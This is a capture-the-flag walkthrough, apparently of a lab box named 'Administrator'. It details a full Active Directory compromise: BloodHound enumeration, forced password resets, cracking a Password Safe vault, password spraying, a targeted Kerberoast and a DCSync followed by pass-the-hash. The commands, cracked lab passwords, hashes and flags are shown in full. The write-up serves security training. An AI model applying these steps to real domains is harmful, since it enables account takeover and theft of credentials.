### Summary
We start with credentials for `olivia` that give us access to LDAP and SMB, allowing us to use bloodhound to dump AD information. We find that `olivia` has `GenericAll` over the user `michael`, allowing us to reset their password. We find that `michael` has `ForcePasswordChange` for the user `benjamin` who belongs to the `File Share Owner` group, allowing us access to the `FTP` server where we find a password safe. We crack the safe's master password, giving us a few passwords that we can spray to gain credentials for `emily`. We find `emily` has `GenericWrite` over `ethan`, allowing us to perform a `Targeted Kerberoast` attack and crack `ethan`'s hash. `ethan` has `DCSYNC` over the domain, allowing us to run `secretsdump.py`, dumping the administrator hash which we can use to gain a `WinRM` shell as root!

### Tools
- `net` - change users' passwords via Windows
- `hashcat`
- `secretsdump.py` - DCSync attack to dump hashes

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc hosts file]]
- [[#FTP - TCP 21]]
- [[#SMB - TCP 445]]
- [[#Bloodhound]]
	- [[#WinRM]]
###### [[#User Shell - michael]]
- [[#GenericAll]]
###### [[#User Auth - benjamin]]
- [[#Bloodhound Part 2]]
- [[#FTP Authed - TCP 21]]
- [[#Password Safe]]
###### [[#User Shell - emily]]
- [[#WinRM Emily]]
- [[#Bloodhound Round 3]]
###### [[#User Auth - ethan]]
- [[#Targeted Kerberoast]]
	- [[#Crack Ethan's Hash]]
###### [[#Root Shell]]
- [[#Bloodhound Final]]
	- [[#DCSYNC]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.19.205 -oN nmap/tcp
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
56998/tcp open  unknown          syn-ack ttl 127
57003/tcp open  unknown          syn-ack ttl 127
57014/tcp open  unknown          syn-ack ttl 127
57028/tcp open  unknown          syn-ack ttl 127
57061/tcp open  unknown          syn-ack ttl 127
60375/tcp open  unknown          syn-ack ttl 127

❯ sudo nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,56998,57003,57014,57028,57061,60375 -sCV -vv 10.129.19.205 -oN nmap/tcpScripts
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-11 02:41:34Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
56998/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
57003/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57014/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57028/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
57061/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60375/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-time:
|   date: 2026-02-11T02:42:33
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38914/tcp): CLEAN (Couldn\'t connect)
|   Check 2 (port 47450/tcp): CLEAN (Couldn\'t connect)
|   Check 3 (port 39525/udp): CLEAN (Timeout)
|   Check 4 (port 50463/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```
- We're working with a Windows Active Directory environment
- We've got some clock skew that we'll need to account for when playing with Kerberos
- We've got what nmap thinks are web servers on ports on `5985` and `47001` but they're inaccessible
- We're given a set of credentials to login: `Olivia` / `ichliebedich`

### nxc hosts file
```sh
❯ nxc smb 10.129.19.205 --generate-hosts-file hosts
SMB         10.129.19.205   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## FTP - TCP 21
---
- We can try to get `FTP` access with `nxc` but as we can see:
```sh
❯ nxc ftp 10.129.19.205 -u olivia -p ichliebedich
FTP         10.129.19.205   21     10.129.19.205    [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)
```
- Doesn't look like we've got access

## SMB - TCP 445
---
- We can verify that the given credentials have access to `SMB`:
```sh
❯ nxc ldap 10.129.19.205 -u olivia -p ichliebedich
LDAP        10.129.19.205   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.19.205   389    DC               [+] administrator.htb\olivia:ichliebedich 
```

- We can enumerate the shares like so:
```sh
❯ nxc smb 10.129.19.205 -u olivia -p ichliebedich --shares
Share           Permissions     Remark              
-----           -----------     ------              
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
NETLOGON        READ            Logon server share  
SYSVOL          READ            Logon server share  
```

- We can enumerate the users like so:
```sh
❯ nxc smb 10.129.19.205 -u olivia -p ichliebedich --users 
-Username-                    -Last PW Set-       -BadPW- -Description-
Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain       
Guest                         <never>             0       Built-in account for guest access to the computer/domain     
krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account                      
olivia                        2024-10-06 01:22:48 0
michael                       2024-10-06 01:33:37 0
benjamin                      2024-10-06 01:34:56 0
emily                         2024-10-30 23:40:02 0
ethan                         2024-10-12 20:52:14 0
alexander                     2024-10-31 00:18:04 0
emma                          2024-10-31 00:18:35 0
```
- The non-default users, aside from `olivia` are `michael`, `benjamin`, `emily`, `ethan`, `alexander`, and `emma`. We can shove those into a text file for future
- `LDAP` confirms the users as well

## Bloodhound
---
- We can collect active directory information via `bloodhound-ce-python` and ``
```sh
❯ bloodhound-ce-python -d administrator.htb -ns 10.129.19.205 -c all -u olivia -p ichliebedich --zip

❯ rusthound -d administrator.htb -n 10.129.19.205 -u olivia -p ichliebedich --adcs -z 
```

- Then we can pop open the `bloodhound` docker container and shove the generated zipfiles in there

![[Pasted image 20260210222415.png]]
- We immediately see that `olivia` is a member of remote management users, meaning we might be able to grab a `winrm` shell
- They also have `GenericAll` over the user `Michael`

### WinRM
```sh
❯ nxc winrm 10.129.19.205 -u olivia -p ichliebedich                         
WINRM       10.129.19.205   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.129.19.205   5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```
- Wow would you look at that

```sh
❯ evil-winrm -i 10.129.19.205 -u olivia -p ichliebedich
*Evil-WinRM* PS C:\Users\olivia\Desktop> ls -force
*Evil-WinRM* PS C:\Users\olivia\Desktop> 
```
- Nothing here unfortunately
- We can't get `C:\inetpub\ftproot` either

# User Shell - michael
## GenericAll
---
- With `GenericAll` we can do a couple things to gain access to the user:
	- Reset the user's password
	- Generate Shadow Credentials
	- Other situational things

- We can try to generate shadow credentials with `certipy`:
```sh
❯ certipy shadow auto -dc-ip 10.129.19.205 -u olivia -p ichliebedich -account michael -ldap-scheme ldap
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'michael'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ccd9f7d3c99a48618d59da34c0f75230'
[*] Adding Key Credential with device ID 'ccd9f7d3c99a48618d59da34c0f75230' to the Key Credentials for 'michael'
[*] Successfully added Key Credential with device ID 'ccd9f7d3c99a48618d59da34c0f75230' to the Key Credentials for 'michael'
[*] Authenticating as 'michael' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'michael@administrator.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
[*] Restoring the old Key Credentials for 'michael'
[*] Successfully restored the old Key Credentials for 'michael'
[*] NT hash for 'michael': None
```
- I had to do `-ldap-scheme ldap` because by default it uses `ldaps` but secure `LDAP` isn't in play here 
- This failed because `PKINIT` isn't enabled on this box

- Instead let's just swap the password (can inspect actions via BloodHound):
```sh
❯ net rpc password "michael" "password" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.19.205
```
- We can verify it worked via `nxc`:
```sh
❯ nxc smb 10.129.19.205 -u michael -p password
SMB         10.129.19.205   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.205   445    DC               [+] administrator.htb\michael:password 
```

- We can inspect `michael` to see they're also a member of the remote administration group, so we can grab a shell with `WinRM`:
```sh
❯ evil-winrm -i 10.129.19.205 -u michael -p password                
*Evil-WinRM* PS C:\Users\michael\Desktop> ls -force
```
- Still no `user.txt` :(
- `michael` also doesn't have `FTP` access

# User Auth - benjamin
## Bloodhound Part 2
---
![[Pasted image 20260210224938.png]]
- We can see that `michael` is able to change `benjamin`'s password:
```sh
❯ net rpc password "benjamin" "password" -U "administrator.htb"/"michael"%"password" -S 10.129.19.205
```

## FTP Authed - TCP 21
---
- And since `benjamin` is a member of the `Share Moderators` group, they should have `FTP` access:
```sh
❯ nxc ftp 10.129.19.205 -u benjamin -p password
FTP         10.129.19.205   21     10.129.19.205    [+] benjamin:password
```

- There's a single file in the share:
```sh
❯ nxc ftp 10.129.19.205 -u benjamin -p password --ls  
FTP         10.129.19.205   21     10.129.19.205    [+] benjamin:password
FTP         10.129.19.205   21     10.129.19.205    [*] Directory Listing
FTP         10.129.19.205   21     10.129.19.205    10-05-24  08:13AM                  952 Backup.psafe3
```
- We can nab it and get a better look via the command line:
```sh
❯ file Backup.psafe3 
Backup.psafe3: Password Safe V3 database
```

## Password Safe
---
- Looking up password safe v3, we get a link to the following [github rep]([https://www.pwsafe.org/](https://github.com/pwsafe/pwsafe))
- It's a GUI program so I installed it to a QEMU Windows VM, but in order to open it, we need the master password
- The first line of the file is the hashed master password, so we can pass this file directly to `hashcat`!
	- When we pass it to hashcat, we see that hash mode `5200` is for `Password Safe v3`
```sh
❯ hashcat Backup.psafe3 -m 5200 ~/ctf/TOOLS/wordlist/rockyou.txt
...
Backup.psafe3:tekieromucho
...
```
- We almost immediately get a hit, `tekieromucho`
- We pop the vault open and see the following user password combos:
```text
alexander - UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily - UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma - WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

- We can enumerate our list of usernames and passwords via `nxc`:
```sh
❯ nxc smb 10.129.19.205 -u users.txt -p passwords.txt       
SMB         10.129.19.205   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.205   445    DC               [-] administrator.htb\michael:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\benjamin:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\ethan:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\michael:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [-] administrator.htb\benjamin:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
SMB         10.129.19.205   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
```
- Looks like we've got a valid credential! `emily` / `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

# User Shell - emily
## WinRM Emily
---
- We can text if `emily` has `WinRM` access with `nxc`:
```sh
❯ nxc winrm 10.129.19.205 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WINRM       10.129.19.205   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.129.19.205   5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```
- Nice! Maybe we can finally get the user flag:

```sh
❯ evil-winrm -i 10.129.19.205 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
f1a28ce7b16f9538f53dbb8ed4ad1bec
```
- Fuckin finally

## Bloodhound Round 3
---
![[Pasted image 20260210232536.png]]
- Inspecting `bloodhound`, we can see that `emily` has `GenericWrite` over the user `ethan`
- With `GenericWrite`, we can potentially do shadow credential or targeted kerberoast
	- We know shadow credential doesn't work in this case, so let's try a targeted kerberoast

# User Auth - ethan
## Targeted Kerberoast
---
- First we need to alter the target's `Service Principal Name (SPN)`
```sh
❯ bloodyad -d administrator.htb -H DC.administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb set object ethan servicePrincipalName -v 'http/whatever'
[+] ethan's servicePrincipalName has been updated
```
- Now we can dump the hash with `nxc`:
```sh
❯ nxc ldap 10.129.19.205 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoast ethan.hash
LDAP        10.129.19.205   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.19.205   389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.129.19.205   389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.19.205   389    DC               [*] Total of records returned 1
LDAP        10.129.19.205   389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 16:52:14.117811, lastLogon: <never>
LDAP        10.129.19.205   389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$248715af2e0066d752355572cc4736b8$39f32e0b773c01be292c7b42a11ae8f9f326f279e1bd9279be8be97513dc437082cd1357d3c6c92ad40f4309ba9645971d37e130eeefb7210f01514801303669950908eb57d010acbcad7563ad713443ca7ca671c098e69db0a2c46c84a2947a460ccad2544de436847e52d26449cf1fbe264a680c087481886a5b84e1c8186ce1745f60e9b6ce2ca535175ee5c7be671ee0fa7f0d567bcbf53460b6ecf1ca6d6341ca73a6c8787c2ca13daf9bf4485c14ae84e2bea1596a3325cc0c35c1acb02fc990c24733ab3533562c2fed71a2e02e310ff238ead1bed72d171360adaceb081738c4cae5e821816f766f8286e1d42035434b754c88f5d5a47226d36b1ccc42f4e7cef28ce2381fe36ef20b5d6df28785462970fb777c800b5e05202021b6bb854b4d502afc1f62a97ae4f3383dd4342438290894e6802888d521520260360eba923ecf023f08be79ea4a8bc53ca4ef5a05c72a6bd31c55599d91c67fffa6f20c2bf1bbacdf8961f24d75b0572dd4554a84a5e3ca557725f3dd499b8f58a9ed999872fb24eb24fb2da9464b15e02f75493d71b5616f79f24b4b8c54822ed72be1d83868185afce8b8007ef19b8b11573ca8248f6cf5d38bc2cf1d19e2e82fb4fe65ce500b07af2be3575b61e9c6a08c738e9f03ae8d69700944d26ef292681d1726b3ec5d1c32d36d2b799b22b5667f9ae436e799480f56b0d5c270d55dc9b0ee5fecd7346597a4f6aced5ac38e0dd607571830a13a0968447d78f196e483f1738661370553c5de6c30674635cc4c496dec4cc734263f447630cb0e6183fbcee54620963f71683ca545032fedbb711d61843d94a66db8bda9a5a22940b7f12885e3f407ac316fba3978e7be4cfead92adb2e59cdbdfebc6294f574f0dfbafa6e8056bb6d77fb7669236ba2bb573544f595a5524cc9af07d815355a75e1b2f7de93b917d7448b7e7da54c7d42c21fa7f969409b8ab07df53ef5d5f5a6b596d388d79627d4626276659f143342dc544e008ccfb69bb710fc8569ac918d43d6b8b588d5c87f031f6fb3e22962bf2d1b55c3a46f459e13d4fd56dcbf3dbbac1019aa5e6c2513a55c1e0221117a4da923847e007f73ad9b1180821dff4bf29671847109e525fe1fae503cb8ce3586eac881a7782ea50bedd96ff1a02b00238c486b2309d7c9f22c1ed3b6425167c4a9cbf9f0ea1637e58e764311fca84f305a57c755b7ad6313f856356e444984d134482e1fb3083925208d9f5f1c4f4336aaeacec1c38f0daa46e5b0aaa67120b82c044fda7efc3b77dbbeadb860e53797f156e5e217861a39a761a4d3203cdcb111fde5a4dbbd62dcccb74dd35cdded7539e17b6dbc5c767c84cca56caa21d2651cef3bcd89ed033eddcdafecd21bf0858b428e67b3bef5128d16fb4ec4f64802c75232a1a50c7a07d88392db4167e2f34788a1aa99c886b8eca69fd02053a1d03c3fbe34f4f118da0297c5e065726ebe33b2770e09e4e3ade67f42f6fbc9ca813eee69ee114006df43a5ff05e8af41f4737
```

### Crack Ethan's Hash
- Now we can pop open `hashcat` and crack open `ethan`'s hash:
```sh
❯ hashcat ethan.hash ~/ctf/TOOLS/wordlist/rockyou.txt 
...
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$248715af2e0066d752355572cc4736b8$39f32e0b773c01be292c7b42a11ae8f9f326f279e1bd9279be8be97513dc437082cd1357d3c6c92ad40f4309ba9645971d37e130eeefb7210f01514801303669950908eb57d010acbcad7563ad713443ca7ca671c098e69db0a2c46c84a2947a460ccad2544de436847e52d26449cf1fbe264a680c087481886a5b84e1c8186ce1745f60e9b6ce2ca535175ee5c7be671ee0fa7f0d567bcbf53460b6ecf1ca6d6341ca73a6c8787c2ca13daf9bf4485c14ae84e2bea1596a3325cc0c35c1acb02fc990c24733ab3533562c2fed71a2e02e310ff238ead1bed72d171360adaceb081738c4cae5e821816f766f8286e1d42035434b754c88f5d5a47226d36b1ccc42f4e7cef28ce2381fe36ef20b5d6df28785462970fb777c800b5e05202021b6bb854b4d502afc1f62a97ae4f3383dd4342438290894e6802888d521520260360eba923ecf023f08be79ea4a8bc53ca4ef5a05c72a6bd31c55599d91c67fffa6f20c2bf1bbacdf8961f24d75b0572dd4554a84a5e3ca557725f3dd499b8f58a9ed999872fb24eb24fb2da9464b15e02f75493d71b5616f79f24b4b8c54822ed72be1d83868185afce8b8007ef19b8b11573ca8248f6cf5d38bc2cf1d19e2e82fb4fe65ce500b07af2be3575b61e9c6a08c738e9f03ae8d69700944d26ef292681d1726b3ec5d1c32d36d2b799b22b5667f9ae436e799480f56b0d5c270d55dc9b0ee5fecd7346597a4f6aced5ac38e0dd607571830a13a0968447d78f196e483f1738661370553c5de6c30674635cc4c496dec4cc734263f447630cb0e6183fbcee54620963f71683ca545032fedbb711d61843d94a66db8bda9a5a22940b7f12885e3f407ac316fba3978e7be4cfead92adb2e59cdbdfebc6294f574f0dfbafa6e8056bb6d77fb7669236ba2bb573544f595a5524cc9af07d815355a75e1b2f7de93b917d7448b7e7da54c7d42c21fa7f969409b8ab07df53ef5d5f5a6b596d388d79627d4626276659f143342dc544e008ccfb69bb710fc8569ac918d43d6b8b588d5c87f031f6fb3e22962bf2d1b55c3a46f459e13d4fd56dcbf3dbbac1019aa5e6c2513a55c1e0221117a4da923847e007f73ad9b1180821dff4bf29671847109e525fe1fae503cb8ce3586eac881a7782ea50bedd96ff1a02b00238c486b2309d7c9f22c1ed3b6425167c4a9cbf9f0ea1637e58e764311fca84f305a57c755b7ad6313f856356e444984d134482e1fb3083925208d9f5f1c4f4336aaeacec1c38f0daa46e5b0aaa67120b82c044fda7efc3b77dbbeadb860e53797f156e5e217861a39a761a4d3203cdcb111fde5a4dbbd62dcccb74dd35cdded7539e17b6dbc5c767c84cca56caa21d2651cef3bcd89ed033eddcdafecd21bf0858b428e67b3bef5128d16fb4ec4f64802c75232a1a50c7a07d88392db4167e2f34788a1aa99c886b8eca69fd02053a1d03c3fbe34f4f118da0297c5e065726ebe33b2770e09e4e3ade67f42f6fbc9ca813eee69ee114006df43a5ff05e8af41f4737:limpbizkit
...
```
- Almost immediately, we get the password, `limpbizkit`

# Root Shell
## Bloodhound Final
---
![[Pasted image 20260210233838.png]]
- Inspecting `bloodhound`, we see that `ethan` has various interaction options with the `Tier 0` administrator object
- We can use the `secretsdump.py` impacket script to perform a `DCSYNC` attack to obtain the password hash of an arbitrary principal 

### DCSYNC
```sh
❯ secretsdump.py 'ethan':'limpbizkit'@'dc.administrator.htb' 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
...
```
- The `administrator` hash is `3dc553ce4b9fd20bd016e098d2d2fd2e`

```sh
❯ evil-winrm -i 10.129.19.205 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e  
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
547a201a0b99213357b451b11b022b27
```
